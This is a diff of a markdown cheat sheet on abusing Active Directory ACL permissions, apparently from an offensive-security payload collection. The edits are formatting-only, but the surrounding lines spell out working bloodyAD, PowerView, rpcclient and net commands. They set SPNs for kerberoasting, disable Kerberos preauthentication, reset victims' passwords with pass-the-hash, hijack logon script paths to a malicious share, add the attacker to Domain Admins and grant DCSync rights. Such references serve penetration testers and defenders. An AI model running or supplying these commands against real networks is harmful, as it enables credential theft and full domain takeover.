@@ -20,8 +20,9 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 
 ### User/Computer
 
-* We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
-    * Windows/Linux
+We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
+    
+* Windows/Linux
 
   ```ps1
   # Check for interesting permissions on accounts:
@@ -40,7 +41,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname
   ```
 
-    * Windows only
+* Windows only
 
   ```ps1
   # Check for interesting permissions on accounts:
@@ -62,8 +63,9 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
   ```
 
-* We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.
-    * Windows/Linux:
+We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.
+
+* Windows/Linux:
 
   ```ps1
   # Modify the userAccountControl
@@ -76,7 +78,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH
   ```
 
-    * Windows only:
+* Windows only:
 
   ```ps1
   # Modify the userAccountControl
@@ -92,15 +94,16 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
   ```
 
-* Reset another user's password.
-    * Windows/Linux:
+Reset another user's password.
+
+* Windows/Linux:
 
   ```ps1
   # Using bloodyAD with pass-the-hash
   bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!'
   ```
 
-    * Windows only:
+* Windows only:
 
   ```ps1
   # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
@@ -111,21 +114,22 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
   ```
 
-    * Linux only:
+* Linux only:
 
   ```ps1
   # Using rpcclient from the  Samba software suite
   rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
   ```
 
-* WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script :
-    * Windows/Linux:
+WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script :
+
+* Windows/Linux:
 
   ```ps1
   bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
   ```
 
-    * Windows only:
+* Windows only:
 
   ```ps1
   Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
@@ -133,20 +137,21 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 
 ### Group
 
-* This ACE allows us to add ourselves to the Domain Admin group :
-    * Windows/Linux:
+This ACE allows us to add ourselves to the Domain Admin group :
+
+* Windows/Linux:
 
   ```ps1
   bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker
   ```
 
-    * Windows only:
+* Windows only:
 
   ```ps1
   net group "domain admins" hacker /add /domain
   ```
 
-    * Linux only:
+* Linux only:
 
   ```ps1
   # Using the Samba software suite
@@ -183,8 +188,9 @@ NOTE: To not alert the user the payload should hide its own process window and s
 
 To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights `Replicating Directory Changes/Replicating Directory Changes All`.
 
-* WriteDACL on Domain:
-    * Windows/Linux:
+### WriteDACL on Domain
+
+* Windows/Linux:
 
   ```ps1
   # Give DCSync right to the principal identity
@@ -194,7 +200,7 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B remove dcsync user2
   ```
 
-    * Windows only:
+* Windows only:
 
   ```ps1
   # Give DCSync right to the principal identity
@@ -204,8 +210,9 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
   ```
   
-* WriteDACL on Group:
-    * Windows/Linux:
+### WriteDACL on Group
+
+* Windows/Linux:
 
   ```ps1
   bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
@@ -214,7 +221,7 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
   ```
 
-    * Windows only:
+* Windows only:
 
   ```ps1
   # Using native command
